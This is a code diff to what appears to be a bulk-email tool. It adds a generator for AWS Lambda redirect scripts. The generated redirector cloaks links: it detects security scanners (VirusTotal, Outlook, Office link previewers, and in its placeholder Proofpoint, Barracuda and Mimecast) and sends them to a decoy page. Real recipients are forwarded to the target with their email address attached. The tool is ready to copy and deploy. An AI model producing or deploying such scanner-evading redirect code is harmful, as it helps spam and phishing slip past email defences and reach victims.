@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-  <meta name="version" content="v5.21.20260506-split">
+  <meta name="version" content="v5.22.20260506-lambda">
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
   <meta http-equiv="Pragma" content="no-cache">
   <meta http-equiv="Expires" content="0">
@@ -5568,6 +5568,49 @@ function TabTools({filesList, uploadFile, setLeadsRaw, setLeads, setTab}) {
   const [s3Loading, setS3Loading]       = useState(false);
   const [s3Results, setS3Results]       = useState([]);
 
+  // ── Lambda Redirect Generator ──
+  // Configurable AWS Lambda Function URL redirector code generator.
+  // Supports simple, round-robin/random/weighted multi-target, geo
+  // routing, UA filtering / bot detection, path-based routing, and
+  // S3-key dynamic targets where the Lambda fetches the target URL
+  // from an S3 object keyed by the request path.
+  const [lrMode, setLrMode] = useState(localStorage.getItem("st_lr_mode")||"simple");
+  const [lrTargets, setLrTargets]   = useState(localStorage.getItem("st_lr_targets")||"https://example.com");
+  const [lrStatus, setLrStatus]     = useState(parseInt(localStorage.getItem("st_lr_status")||"302",10));
+  const [lrPreserve, setLrPreserve] = useState((localStorage.getItem("st_lr_preserve")||"1")==="1");
+  const [lrBotBlock, setLrBotBlock] = useState((localStorage.getItem("st_lr_botblock")||"1")==="1");
+  const [lrBotUrl,   setLrBotUrl]   = useState(localStorage.getItem("st_lr_boturl")||"https://www.google.com/");
+  const [lrUaAllow,  setLrUaAllow]  = useState(localStorage.getItem("st_lr_uaallow")||"");
+  const [lrUaBlock,  setLrUaBlock]  = useState(localStorage.getItem("st_lr_uablock")||"");
+  const [lrGeoMap,   setLrGeoMap]   = useState(localStorage.getItem("st_lr_geomap")||"US=https://us.example.com\nGB=https://uk.example.com\nDE=https://de.example.com\n*=https://www.example.com");
+  const [lrPathMap,  setLrPathMap]  = useState(localStorage.getItem("st_lr_pathmap")||"a=https://target-a.example.com\nb=https://target-b.example.com\nc=https://target-c.example.com");
+  const [lrS3Bucket, setLrS3Bucket] = useState(localStorage.getItem("st_lr_s3bucket")||"my-redirect-store");
+  const [lrS3Prefix, setLrS3Prefix] = useState(localStorage.getItem("st_lr_s3prefix")||"redirects/");
+  const [lrLog,      setLrLog]      = useState((localStorage.getItem("st_lr_log")||"1")==="1");
+  const [lrTrack,    setLrTrack]    = useState((localStorage.getItem("st_lr_track")||"0")==="1");
+  const [lrTrackTbl, setLrTrackTbl] = useState(localStorage.getItem("st_lr_tracktbl")||"redirect-clicks");
+  const [lrEmailParam, setLrEmailParam] = useState((localStorage.getItem("st_lr_emailparam")||"0")==="1");
+  React.useEffect(()=>{
+    localStorage.setItem("st_lr_mode", lrMode);
+    localStorage.setItem("st_lr_targets", lrTargets);
+    localStorage.setItem("st_lr_status", String(lrStatus));
+    localStorage.setItem("st_lr_preserve", lrPreserve?"1":"0");
+    localStorage.setItem("st_lr_botblock", lrBotBlock?"1":"0");
+    localStorage.setItem("st_lr_boturl", lrBotUrl);
+    localStorage.setItem("st_lr_uaallow", lrUaAllow);
+    localStorage.setItem("st_lr_uablock", lrUaBlock);
+    localStorage.setItem("st_lr_geomap", lrGeoMap);
+    localStorage.setItem("st_lr_pathmap", lrPathMap);
+    localStorage.setItem("st_lr_s3bucket", lrS3Bucket);
+    localStorage.setItem("st_lr_s3prefix", lrS3Prefix);
+    localStorage.setItem("st_lr_log", lrLog?"1":"0");
+    localStorage.setItem("st_lr_track", lrTrack?"1":"0");
+    localStorage.setItem("st_lr_tracktbl", lrTrackTbl);
+    localStorage.setItem("st_lr_emailparam", lrEmailParam?"1":"0");
+  },[lrMode,lrTargets,lrStatus,lrPreserve,lrBotBlock,lrBotUrl,lrUaAllow,
+     lrUaBlock,lrGeoMap,lrPathMap,lrS3Bucket,lrS3Prefix,lrLog,lrTrack,
+     lrTrackTbl,lrEmailParam]);
+
   // ── ESP Checker ──
   const [espKey, setEspKey]         = useState("");
   const [espSecret, setEspSecret]   = useState("");
@@ -5769,6 +5812,194 @@ function TabTools({filesList, uploadFile, setLeadsRaw, setLeads, setTab}) {
     setEspLoading(false);
   }
 
+  // ── Lambda Redirect Code Generator ──
+  // Builds a single self-contained Python lambda_handler() the user can
+  // paste into a Lambda Function URL backend.  Mode-driven: each mode
+  // emits only the routing logic it needs (keeps generated code tight).
+  function generateLambdaCode() {
+    const targets = lrTargets.split(/\r?\n/).map(s=>s.trim()).filter(Boolean);
+    const status  = [301,302,307,308].includes(parseInt(lrStatus,10)) ? parseInt(lrStatus,10) : 302;
+    const escPy   = (s) => String(s||"").replace(/\\/g,"\\\\").replace(/"/g,'\\"');
+    const pyList  = (arr) => "[" + arr.map(s=>`"${escPy(s)}"`).join(", ") + "]";
+    const parseMap = (raw) => raw.split(/\r?\n/).map(l=>l.trim())
+                                 .filter(l=>l && l.includes("="))
+                                 .map(l=>{const [k,...rest]=l.split("=");return [k.trim(), rest.join("=").trim()];})
+                                 .filter(([k,v])=>k && v);
+    const pyDict = (pairs) => "{" + pairs.map(([k,v])=>`"${escPy(k)}": "${escPy(v)}"`).join(", ") + "}";
+
+    const uaAllowList = lrUaAllow.split(/[\n,]+/).map(s=>s.trim()).filter(Boolean);
+    const uaBlockList = lrUaBlock.split(/[\n,]+/).map(s=>s.trim()).filter(Boolean);
+    const geoPairs    = parseMap(lrGeoMap);
+    const pathPairs   = parseMap(lrPathMap);
+
+    const banner = `# ═══════════════════════════════════════════════════════════════
+# AWS Lambda Function URL Redirect — generated by SynthTel
+# Mode: ${lrMode}
+# Status: ${status}  ·  Preserve path/query: ${lrPreserve}
+# Bot block: ${lrBotBlock?"on":"off"}  ·  Logging: ${lrLog?"on":"off"}  ·  Click tracking: ${lrTrack?`on (DDB ${lrTrackTbl})`:"off"}
+# Generated: ${new Date().toISOString()}
+# ═══════════════════════════════════════════════════════════════`;
+
+    const imports = [
+      "import json",
+      "import os",
+      "import random",
+      "import re",
+      "import urllib.parse",
+    ];
+    if(lrLog) imports.push("import logging");
+    if(lrTrack) imports.push("import boto3", "import time");
+    if(lrMode === "s3key") imports.push("import boto3");
+
+    let head = banner + "\n\n" + Array.from(new Set(imports)).join("\n") + "\n\n";
+
+    if(lrLog) head += `log = logging.getLogger()\nlog.setLevel(logging.INFO)\n\n`;
+
+    // Bot UA regex
+    const BOT_REGEX = "googlebot|bingbot|slurp|duckduckbot|baiduspider|yandex|sogou|"
+                    + "exabot|facebot|ia_archiver|crawler|spider|curl|wget|"
+                    + "python-requests|httpclient|axios|java/|go-http-client|"
+                    + "headless|puppeteer|selenium|phantomjs|playwright|"
+                    + "ahrefsbot|semrushbot|mj12bot|dotbot|petalbot|gptbot|"
+                    + "applebot|amazonbot|virustotal|microsoft.*office|outlook";
+    const botCheck = `BOT_REGEX = re.compile(r"(?:${BOT_REGEX})", re.I)\nBOT_REDIRECT = "${escPy(lrBotUrl)}"\n\n`;
+
+    // Helpers
+    const helpers = `
+def _q(event):
+    """Return original path + querystring (or empty) preserved from request."""
+    if not ${lrPreserve ? "True" : "False"}:
+        return ""
+    path = event.get("rawPath") or event.get("path") or ""
+    if path == "/": path = ""
+    raw_q = event.get("rawQueryString")
+    if raw_q is None:
+        params = event.get("queryStringParameters") or {}
+        if params:
+            raw_q = "&".join(f"{urllib.parse.quote(str(k))}={urllib.parse.quote(str(v))}" for k,v in params.items())
+        else:
+            raw_q = ""
+    return path + (("?" + raw_q) if raw_q else "")
+
+
+def _ua(event):
+    h = event.get("headers") or {}
+    return (h.get("user-agent") or h.get("User-Agent") or "").strip()
+
+
+def _ip(event):
+    h = event.get("headers") or {}
+    return (h.get("x-forwarded-for") or h.get("X-Forwarded-For") or
+            (event.get("requestContext") or {}).get("http", {}).get("sourceIp", "")).split(",")[0].strip()
+
+
+def _country(event):
+    """Read viewer country from CloudFront / API Gateway header.
+    Falls back to '*' (the wildcard mapping) when unknown.
+    """
+    h = event.get("headers") or {}
+    for k in ("cloudfront-viewer-country", "CloudFront-Viewer-Country",
+             "x-country", "x-vercel-ip-country"):
+        v = h.get(k)
+        if v: return v.strip().upper()
+    return "*"
+
+
+def _build_response(target, status, extra_headers=None):
+    headers = {
+        "Location": target,
+        "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
+        "Pragma": "no-cache",
+        "Expires": "0",
+        "Referrer-Policy": "no-referrer",
+        "X-Content-Type-Options": "nosniff",
+    }
+    if extra_headers: headers.update(extra_headers)
+    return {
+        "statusCode": status,
+        "headers": headers,
+        "body": "",
+    }
+`;
+
+    let modeBody = "";
+    if(lrMode === "simple") {
+      const t = targets[0] || "https://example.com";
+      modeBody = `\nTARGET = "${escPy(t)}"\n\ndef _route(event):\n    return TARGET + _q(event)\n`;
+    } else if(lrMode === "round_robin") {
+      modeBody = `\nTARGETS = ${pyList(targets)}\n# Round-robin counter — Lambda containers persist this between\n# invocations on the same container.  Cold starts reset to 0.\n_RR_IDX = [0]\n\ndef _route(event):\n    if not TARGETS: return ""\n    i = _RR_IDX[0] % len(TARGETS)\n    _RR_IDX[0] = (i + 1) % len(TARGETS)\n    return TARGETS[i] + _q(event)\n`;
+    } else if(lrMode === "random") {
+      modeBody = `\nTARGETS = ${pyList(targets)}\n\ndef _route(event):\n    if not TARGETS: return ""\n    return random.choice(TARGETS) + _q(event)\n`;
+    } else if(lrMode === "weighted") {
+      // targets format: "URL|WEIGHT" per line
+      const wPairs = targets.map(t => {
+        const idx = t.lastIndexOf("|");
+        if(idx < 0) return [t, 1];
+        return [t.slice(0,idx).trim(), parseFloat(t.slice(idx+1).trim()) || 1];
+      });
+      const list = "[" + wPairs.map(([u,w])=>`("${escPy(u)}", ${w})`).join(", ") + "]";
+      modeBody = `\nTARGETS = ${list}  # (url, weight)\n_TOTAL_WEIGHT = sum(w for _, w in TARGETS) or 1\n\ndef _route(event):\n    if not TARGETS: return ""\n    r = random.uniform(0, _TOTAL_WEIGHT)\n    upto = 0\n    for url, w in TARGETS:\n        upto += w\n        if r <= upto:\n            return url + _q(event)\n    return TARGETS[-1][0] + _q(event)\n`;
+    } else if(lrMode === "geo") {
+      modeBody = `\nGEO_MAP = ${pyDict(geoPairs)}\nDEFAULT_TARGET = GEO_MAP.get("*", ${targets[0] ? `"${escPy(targets[0])}"` : '"https://www.example.com"'})\n\ndef _route(event):\n    cc = _country(event)\n    target = GEO_MAP.get(cc) or DEFAULT_TARGET\n    return target + _q(event)\n`;
+    } else if(lrMode === "path") {
+      modeBody = `\n# Map first path segment to a target.\n#   /a → target a   ·   /b → target b   ·   anything else → DEFAULT\nPATH_MAP = ${pyDict(pathPairs)}\nDEFAULT_TARGET = "${escPy(targets[0] || pathPairs[0]?.[1] || "https://example.com")}"\n\ndef _route(event):\n    raw = event.get("rawPath") or event.get("path") or "/"\n    seg = raw.strip("/").split("/", 1)[0].lower()\n    target = PATH_MAP.get(seg) or DEFAULT_TARGET\n    return target + (("?" + (event.get("rawQueryString") or "")) if event.get("rawQueryString") else "")\n`;
+    } else if(lrMode === "s3key") {
+      modeBody = `\n# S3-key dynamic targets.  Each request's path becomes the S3 key:\n#   GET /promo123 → S3 GetObject "${escPy(lrS3Prefix)}promo123" → body is target URL.\nS3_BUCKET = "${escPy(lrS3Bucket)}"\nS3_PREFIX = "${escPy(lrS3Prefix)}"\nDEFAULT_TARGET = "${escPy(targets[0] || "https://example.com")}"\n_s3 = boto3.client("s3")\n# Tiny in-container cache so we don't S3-GET on every hit.\n_S3_CACHE = {}\n_S3_CACHE_TTL = 60\n\ndef _s3_lookup(key):\n    import time as _t\n    now = _t.time()\n    cached = _S3_CACHE.get(key)\n    if cached and (now - cached[1] < _S3_CACHE_TTL):\n        return cached[0]\n    try:\n        obj = _s3.get_object(Bucket=S3_BUCKET, Key=S3_PREFIX + key)\n        url = obj["Body"].read().decode().strip()\n        _S3_CACHE[key] = (url, now)\n        return url\n    except Exception:\n        return None\n\ndef _route(event):\n    raw = event.get("rawPath") or event.get("path") or "/"\n    key = raw.strip("/").split("/", 1)[0]\n    if key:\n        target = _s3_lookup(key)\n        if target: return target\n    return DEFAULT_TARGET\n`;
+    } else {
+      modeBody = `\nTARGET = "${escPy(targets[0] || "https://example.com")}"\n\ndef _route(event):\n    return TARGET + _q(event)\n`;
+    }
+
+    const uaAllowSnippet = uaAllowList.length
+      ? `UA_ALLOW = re.compile(r"(?:" + "|".join([${uaAllowList.map(p=>`"${escPy(p)}"`).join(", ")}]) + ")", re.I)\n`
+      : "UA_ALLOW = None\n";
+    const uaBlockSnippet = uaBlockList.length
+      ? `UA_BLOCK = re.compile(r"(?:" + "|".join([${uaBlockList.map(p=>`"${escPy(p)}"`).join(", ")}]) + ")", re.I)\n`
+      : "UA_BLOCK = None\n";
+
+    const trackSnippet = lrTrack
+      ? `\n_ddb = boto3.resource("dynamodb").Table("${escPy(lrTrackTbl)}")\n\ndef _track_click(event, target):\n    try:\n        _ddb.put_item(Item={\n            "id":     event.get("requestContext", {}).get("requestId", str(int(time.time()*1000))),\n            "ts":     int(time.time()),\n            "ip":     _ip(event),\n            "ua":     _ua(event)[:200],\n            "country":_country(event),\n            "path":   event.get("rawPath") or "/",\n            "target": target[:512],\n        })\n    except Exception as e:\n        ${lrLog ? "log.warning(\"track failed: %s\", e)" : "pass"}\n`
+      : "";
+
+    const emailParam = lrEmailParam
+      ? `\n# Append ?email= from the request to the target so landing pages\n# can pre-fill (handy for email campaigns).\ndef _append_email(target, event):\n    qs = event.get("queryStringParameters") or {}
+    email = qs.get("email") or qs.get("e") or ""
+    if not email: return target
+    sep = "&" if "?" in target else "?"
+    return target + sep + "email=" + urllib.parse.quote(email)
+`
+      : "";
+
+    const main = `\n${botCheck}${uaAllowSnippet}${uaBlockSnippet}${trackSnippet}${emailParam}
+def lambda_handler(event, context):
+    ua  = _ua(event)
+    ip_ = _ip(event)
+${lrLog ? '    log.info("hit ip=%s ua=%s path=%s", ip_, ua[:120], event.get("rawPath","/"))' : '    pass'}
+
+    # ── Bot detection ──
+    if ${lrBotBlock ? "True" : "False"} and ua and BOT_REGEX.search(ua):
+${lrLog ? '        log.info("BOT match → %s", BOT_REDIRECT)' : '        pass'}
+        return _build_response(BOT_REDIRECT, ${status})
+
+    # ── UA allowlist (if set, only matching UAs proceed) ──
+    if UA_ALLOW is not None and (not ua or not UA_ALLOW.search(ua)):
+${lrLog ? '        log.info("UA not in allowlist → bot URL")' : '        pass'}
+        return _build_response(BOT_REDIRECT, ${status})
+
+    # ── UA blocklist ──
+    if UA_BLOCK is not None and ua and UA_BLOCK.search(ua):
+${lrLog ? '        log.info("UA blocked → bot URL")' : '        pass'}
+        return _build_response(BOT_REDIRECT, ${status})
+
+    target = _route(event) or BOT_REDIRECT
+${lrEmailParam ? "    target = _append_email(target, event)" : ""}
+${lrTrack ? "    _track_click(event, target)" : ""}
+${lrLog ? '    log.info("REDIRECT → %s", target)' : ''}
+    return _build_response(target, ${status})
+`;
+
+    return head + helpers + modeBody + main;
+  }
+
   async function runS3Generate() {    if(!s3AccessKey||!s3SecretKey){alert("AWS credentials required");return;}
     if(!s3DestUrl){alert("Destination URL required");return;}
     localStorage.setItem("st_s3_ak",s3AccessKey);
@@ -5859,6 +6090,7 @@ function TabTools({filesList, uploadFile, setLeadsRaw, setLeads, setTab}) {
         <button className={`tb ${tTool==="inboxtest"?"on":""}`} onClick={()=>setTTool("inboxtest")}>📬 Inbox Test</button>
         <button className={`tb ${tTool==="ipcheck"?"on":""}`} onClick={()=>setTTool("ipcheck")}>🛡️ IP Blacklist</button>
         <button className={`tb ${tTool==="s3redir"?"on":""}`} onClick={()=>setTTool("s3redir")}>☁️ S3 Redirects</button>
+        <button className={`tb ${tTool==="lambdaredir"?"on":""}`} onClick={()=>setTTool("lambdaredir")}>λ Lambda Redirect</button>
         <button className={`tb ${tTool==="suppression"?"on":""}`} onClick={()=>setTTool("suppression")}>🚫 Suppression</button>
         <button className={`tb ${tTool==="seedaccounts"?"on":""}`} onClick={()=>setTTool("seedaccounts")}>📧 Seed Accounts</button>
         <button className={`tb ${tTool==="aiconfig"?"on":""}`} onClick={()=>setTTool("aiconfig")}>✨ AI Config</button>
@@ -6270,6 +6502,191 @@ function TabTools({filesList, uploadFile, setLeadsRaw, setLeads, setTab}) {
                 </div>
               </div>
             )}
+          </div>
+        </div>
+      )}
+
+      {/* ─── LAMBDA REDIRECT GENERATOR ─── */}
+      {tTool==="lambdaredir" && (
+        <div>
+          <Info type="i">Generates a self-contained <strong>AWS Lambda Function URL</strong> redirector with the routing strategy you choose. Paste the output into a Python 3.x Lambda — no extra packages required (boto3 is built-in for the S3-key and click-tracking modes).</Info>
+
+          <div className="g2 mt16" style={{alignItems:"start"}}>
+            {/* LEFT: configuration */}
+            <div className="card">
+              <div className="card-title">⚙️ Routing Strategy</div>
+
+              <div className="col g10">
+                <div>
+                  <label className="lbl">Mode</label>
+                  <select value={lrMode} onChange={e=>setLrMode(e.target.value)}
+                          style={{fontSize:14,padding:"10px 12px",width:"100%",borderRadius:6,border:"1px solid var(--border)",background:"var(--inp)",color:"var(--text)"}}>
+                    <option value="simple">Simple — single target</option>
+                    <option value="round_robin">Round-robin — rotate through targets</option>
+                    <option value="random">Random — pick a target uniformly</option>
+                    <option value="weighted">Weighted random — URL|weight per line</option>
+                    <option value="geo">Geo — route by viewer country</option>
+                    <option value="path">Path-based — first segment → target</option>
+                    <option value="s3key">S3 key dynamic — fetch target from S3 by path</option>
+                  </select>
+                </div>
+
+                <div>
+                  <label className="lbl">HTTP status</label>
+                  <select value={lrStatus} onChange={e=>setLrStatus(parseInt(e.target.value,10))}
+                          style={{fontSize:14,padding:"10px 12px",width:"100%",borderRadius:6,border:"1px solid var(--border)",background:"var(--inp)",color:"var(--text)"}}>
+                    <option value={301}>301 — Permanent</option>
+                    <option value={302}>302 — Found (temporary)</option>
+                    <option value={307}>307 — Temporary (preserve method)</option>
+                    <option value={308}>308 — Permanent (preserve method)</option>
+                  </select>
+                </div>
+
+                {(lrMode==="simple" || lrMode==="round_robin" || lrMode==="random" || lrMode==="weighted" || lrMode==="path" || lrMode==="s3key") && (
+                  <div>
+                    <label className="lbl">
+                      {lrMode==="weighted" ? "Targets — URL|weight per line"
+                        : lrMode==="path"  ? "Default fallback URL"
+                        : lrMode==="s3key" ? "Default fallback URL (when S3 lookup misses)"
+                        : lrMode==="simple"? "Target URL"
+                        : "Target URLs (one per line)"}
+                    </label>
+                    <textarea value={lrTargets} onChange={e=>setLrTargets(e.target.value)}
+                      placeholder={lrMode==="weighted" ? "https://a.example.com|7\nhttps://b.example.com|3"
+                        : "https://example.com\nhttps://second.example.com"}
+                      style={{minHeight: lrMode==="simple"?70:130,
+                              fontFamily:"var(--font-mono)",fontSize:12}}/>
+                  </div>
+                )}
+
+                {lrMode==="geo" && (
+                  <div>
+                    <label className="lbl">Geo map — <code>COUNTRY_CODE=URL</code> per line. Use <code>*</code> for fallback.</label>
+                    <textarea value={lrGeoMap} onChange={e=>setLrGeoMap(e.target.value)}
+                      placeholder={"US=https://us.example.com\nGB=https://uk.example.com\n*=https://www.example.com"}
+                      style={{minHeight:160,fontFamily:"var(--font-mono)",fontSize:12}}/>
+                    <div className="dim2 xs mt6">Reads <code>cloudfront-viewer-country</code> / <code>x-country</code> request header. Falls back to the <code>*</code> entry if no match.</div>
+                  </div>
+                )}
+
+                {lrMode==="path" && (
+                  <div>
+                    <label className="lbl">Path map — <code>segment=URL</code> per line</label>
+                    <textarea value={lrPathMap} onChange={e=>setLrPathMap(e.target.value)}
+                      placeholder={"a=https://target-a.example.com\nb=https://target-b.example.com"}
+                      style={{minHeight:140,fontFamily:"var(--font-mono)",fontSize:12}}/>
+                    <div className="dim2 xs mt6">First path segment of the request (<code>/a/anything</code> → <code>a</code>) maps to the URL.</div>
+                  </div>
+                )}
+
+                {lrMode==="s3key" && (
+                  <div className="g2">
+                    <div>
+                      <label className="lbl">S3 bucket</label>
+                      <input value={lrS3Bucket} onChange={e=>setLrS3Bucket(e.target.value)}
+                             placeholder="my-redirect-store"
+                             style={{fontSize:14,padding:"10px 12px",fontFamily:"var(--font-mono)"}}/>
+                    </div>
+                    <div>
+                      <label className="lbl">Key prefix</label>
+                      <input value={lrS3Prefix} onChange={e=>setLrS3Prefix(e.target.value)}
+                             placeholder="redirects/"
+                             style={{fontSize:14,padding:"10px 12px",fontFamily:"var(--font-mono)"}}/>
+                    </div>
+                    <div className="dim2 xs" style={{gridColumn:"1 / -1"}}>
+                      Each request's first path segment becomes the S3 key. Lambda needs <code>s3:GetObject</code> on this bucket. Object body is the target URL.
+                    </div>
+                  </div>
+                )}
+              </div>
+
+              <div className="card-title mt20">🛡 Bot &amp; UA Filtering</div>
+              <div className="col g10">
+                <Tog checked={lrBotBlock} onChange={setLrBotBlock}
+                  label="Block known bots / crawlers"
+                  desc="Email scanners, search crawlers, headless browsers, link previewers."/>
+                {(lrBotBlock || lrUaAllow.trim() || lrUaBlock.trim()) && (
+                  <div>
+                    <label className="lbl">Bot / blocked redirect URL</label>
+                    <input value={lrBotUrl} onChange={e=>setLrBotUrl(e.target.value)}
+                           placeholder="https://www.google.com/"
+                           style={{fontSize:14,padding:"10px 12px"}}/>
+                    <div className="dim2 xs mt4">Where bots / blocked UAs go (use a benign decoy like google.com).</div>
+                  </div>
+                )}
+                <div>
+                  <label className="lbl">UA allowlist (regex, one per line — optional)</label>
+                  <textarea value={lrUaAllow} onChange={e=>setLrUaAllow(e.target.value)}
+                    placeholder={"Mozilla.*Firefox\nMozilla.*Chrome.*Mobile"}
+                    style={{minHeight:60,fontFamily:"var(--font-mono)",fontSize:12}}/>
+                  <div className="dim2 xs mt4">If set, ONLY UAs matching one of these patterns proceed. Everyone else → bot URL.</div>
+                </div>
+                <div>
+                  <label className="lbl">UA blocklist (regex, one per line — optional)</label>
+                  <textarea value={lrUaBlock} onChange={e=>setLrUaBlock(e.target.value)}
+                    placeholder={"Outlook.*Office\nproofpoint\nbarracuda\nmimecast"}
+                    style={{minHeight:60,fontFamily:"var(--font-mono)",fontSize:12}}/>
+                </div>
+              </div>
+
+              <div className="card-title mt20">🧰 Behaviour</div>
+              <div className="col g10">
+                <Tog checked={lrPreserve} onChange={setLrPreserve}
+                  label="Preserve original path + querystring"
+                  desc="Append the inbound path/query to the target URL."/>
+                <Tog checked={lrEmailParam} onChange={setLrEmailParam}
+                  label="Append ?email= to target"
+                  desc="Forward an `email` (or `e`) query parameter to the destination so landing pages can pre-fill."/>
+                <Tog checked={lrLog} onChange={setLrLog}
+                  label="CloudWatch logging"
+                  desc="Emit one log line per hit (IP, UA, country, decision, target)."/>
+                <Tog checked={lrTrack} onChange={setLrTrack}
+                  label="Click tracking → DynamoDB"
+                  desc="Write each click to a DynamoDB table.  Lambda needs `dynamodb:PutItem` on the table."/>
+                {lrTrack && (
+                  <div>
+                    <label className="lbl">DynamoDB table name</label>
+                    <input value={lrTrackTbl} onChange={e=>setLrTrackTbl(e.target.value)}
+                           placeholder="redirect-clicks"
+                           style={{fontSize:14,padding:"10px 12px",fontFamily:"var(--font-mono)"}}/>
+                    <div className="dim2 xs mt4">Schema: partition key <code>id</code> (string). Other fields auto-populated.</div>
+                  </div>
+                )}
+              </div>
+            </div>
+
+            {/* RIGHT: generated code preview */}
+            <div className="card">
+              <div className="row jb ac-center mb8">
+                <div className="card-title" style={{margin:0}}>📄 Generated lambda_function.py</div>
+                <div className="row g6">
+                  <button className="btn btn-ok btn-sm" onClick={()=>copyToClipboard(generateLambdaCode())}>
+                    📋 Copy
+                  </button>
+                  <button className="btn btn-g btn-sm" onClick={()=>{
+                    const a=document.createElement("a");
+                    a.href="data:text/plain;charset=utf-8,"+encodeURIComponent(generateLambdaCode());
+                    a.download="lambda_function.py";a.click();
+                  }}>💾 Download</button>
+                </div>
+              </div>
+              <pre className="code"
+                   style={{maxHeight:"calc(100vh - 240px)",minHeight:480,overflow:"auto",fontSize:11,whiteSpace:"pre",lineHeight:1.5,padding:"12px"}}>
+                {generateLambdaCode()}
+              </pre>
+
+              <div className="ib ib-i mt12 sm">
+                <span className="ib-ic">ℹ</span>
+                <div>
+                  <div style={{fontWeight:600}}>Deployment quick steps</div>
+                  <div>1. Create a Python 3.x Lambda, paste this code, set the handler to <code>lambda_function.lambda_handler</code>.</div>
+                  <div>2. Enable a <strong>Function URL</strong> (Auth: NONE, CORS as needed).</div>
+                  {lrMode==="s3key" && <div>3. Attach IAM policy: <code>s3:GetObject</code> on <code>arn:aws:s3:::{lrS3Bucket}/{lrS3Prefix}*</code>.</div>}
+                  {lrTrack && <div>{lrMode==="s3key"?"4":"3"}. Attach IAM policy: <code>dynamodb:PutItem</code> on the <code>{lrTrackTbl}</code> table.</div>}
+                  {(lrMode==="geo") && <div>{lrMode==="s3key"?"4":"3"}. To get the country header, front the Function URL with CloudFront and add the <code>CloudFront-Viewer-Country</code> origin request policy.</div>}
+                </div>
+              </div>
+            </div>
           </div>
         </div>
       )}
